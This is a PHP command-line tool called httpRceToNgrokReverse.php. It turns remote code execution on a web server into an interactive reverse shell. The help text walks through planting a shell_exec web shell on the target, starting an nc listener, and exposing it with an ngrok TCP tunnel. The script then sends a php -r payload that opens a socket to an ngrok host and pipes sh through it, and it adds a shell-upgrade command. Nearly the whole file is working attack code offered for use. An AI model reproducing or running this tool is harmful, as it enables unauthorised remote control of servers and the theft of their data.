<?php 

$url = null;
$param = null;
$port = null;

function format($text, $color= null)
{
    switch ($color) {
        case 'red':
            $color = "\033[1;31m";
            break;
        case 'purple':
            $color = "\033[1;35m";
            break;
        case 'yellow':
            $color = "\033[1;33m";
            break;
        case 'blue':
            $color = "\033[0;34m";
            break;
        default:
            $color = "\033[0;37m";
    }

    $reset = "\033[0m";

    return "{$color}{$text}{$reset}";
}

for ($i = 1; $i < $argc; $i++) {
    if ($argv[$i] == "-h" || $argv[$i] == "--help") {
        echo '
_____   _____ ______   _          _____             _____ _          _ _ 
|  __ \ / ____|  ____| | |        |  __ \           / ____| |        | | |
| |__) | |    | |__    | |_ ___   | |__) |_____   _| (___ | |__   ___| | |
|  _  /| |    |  __|   | __/ _ \  |  _  // _ \ \ / /\___ \| \'_ \ / _ \ | |
| | \ \| |____| |____  | || (_) | | | \ \  __/\ V / ____) | | | |  __/ | |
|_|  \_\\_____|______|  \__\___/  |_|  \_\___| \_/ |_____/|_| |_|\___|_|_|
by Myra

'. format("Usage: ", 'yellow') . format("php httpRceToNgrokReverse.php [-u URL] [-q PARAM] [-p PORT] [-h] [-D]", "blue") .'



'. format("To get the reverse shell, you must following this steps before run this script :", 'red') .'

'. format("1.", 'yellow') .' Inject PHP RCE command into the target. Make sure the RCE is working properly.
'. format("|\nExample:  ", 'yellow') . format('if (isset($_GET[\'cmd\'])) shell_exec($_GET[\'cmd\']);', 'purple') .'

'. format("2.", 'yellow') .' Make the tcp listener in your computer using nc. (This will be your reverse shell)
'. format("|\nExample:  ", 'yellow') . format('nc -lvnp 4444', 'purple') .'

'. format("3.", 'yellow') .' Make sure that you already installed ngrok, so your computer can reach by the target publicly. 
'. format("|\nInstall:  ", 'yellow') . format('https://ngrok.com/download', 'purple') .'

'. format("4.", 'yellow') .' Make tcp tunnel connection into the listen port that you\'ve already set.
'. format("|\nExample:  ", 'yellow') . format('ngrok tcp 4444', 'purple') .'

'. format("5.", 'yellow') .' Run this program.
'. format("|\nExample:  ", 'yellow') . format('php httpRceToNgrokReverse.php -u https://target.com -q cmd -p 4444', 'purple') .'

'. format("6.", 'yellow') .' (optional) To upgrade the shell, you can run this command.
'. format("|\nCommand:  ", 'yellow') . format('SHELL=/bin/bash script -q /dev/null', 'purple') .'

        ';
        exit(1);
    } elseif ($argv[$i] == "-u") {
        $url = $argv[++$i];
    } elseif ($argv[$i] == "-q") {
        $param = $argv[++$i];
    } elseif ($argv[$i] == "-p") {
        $port = $argv[++$i];
    }
}

if ($url == null) {
    echo "Target URL                : ";
    $url = trim(fgets(STDIN));
}

if ($param == null) {
    echo "POST/GET RCE Parameter    : ";
    $param = trim(fgets(STDIN));
}

if ($port == null) {
    echo "Port Ngrok                : ";
    $port = trim(fgets(STDIN));
}

$payload = "$param=" . urlencode('php -r \'$sock=fsockopen("0.tcp.ap.ngrok.io",'.$port.');exec("sh <&3 >&3 2>&3");\'');

echo "\n" . $payload;
echo "\n\nexploit...";

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, $url ."?".$payload);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$server_output = curl_exec($ch);
if ($argc > 1 && in_array('-D', $argv)) echo $server_output;

curl_close($ch);

?>